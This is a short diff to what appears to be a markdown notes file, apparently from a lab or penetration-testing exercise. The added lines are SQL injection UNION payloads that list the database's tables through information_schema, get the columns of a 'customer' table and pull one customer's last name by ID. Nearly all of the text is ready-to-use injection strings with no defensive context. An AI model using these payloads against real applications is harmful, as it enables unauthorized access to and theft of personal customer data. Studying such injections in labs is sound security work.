@@ -20,4 +20,12 @@ Useful is probably this one:
 
 > TABLE_NAME
 
-`') UNION ALL SELECT 0,1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables -- .`
+`asdf') UNION ALL SELECT 0,1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables -- .`
+
+Get columns:
+
+`asdf') UNION ALL SELECT 0,1,COLUMN_NAME,3,4,5,6,7,8,9 FROM information_schema.columns where table_name = 'customer' -- .`
+
+Get user lastname:
+
+`asdf') UNION ALL SELECT 0,1,lastname,3,4,5,6,7,8,9 FROM customer WHERE customer_id=420 -- .`
